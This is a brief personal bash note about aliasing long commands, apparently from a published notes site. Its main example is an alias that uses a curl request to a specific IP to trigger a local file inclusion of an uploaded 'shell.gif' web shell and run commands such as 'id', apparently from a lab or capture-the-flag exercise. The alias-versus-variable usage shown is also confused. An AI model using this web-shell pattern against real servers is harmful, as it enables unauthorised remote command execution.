---
{"dg-publish":true,"permalink":"/programming/bash-stuff/aliases-and-variables/"}
---


Sometimes it's nice to alias a long command. One of the examples was:

`alias cs='curl -s http://209.97.185.157:32726/index.php?language=./profile_images/shell.gif&cmd='`

and 
`alias fl='sed -n '\''/<h2>Containers<\/h2>/,/<p class="read-more">/p'\'

Then you could use this with a command by entereing:
${cs}id | fl

It took me a while to find out how to make it so that bash wouldn't insert a space between the end of the alias and the command.
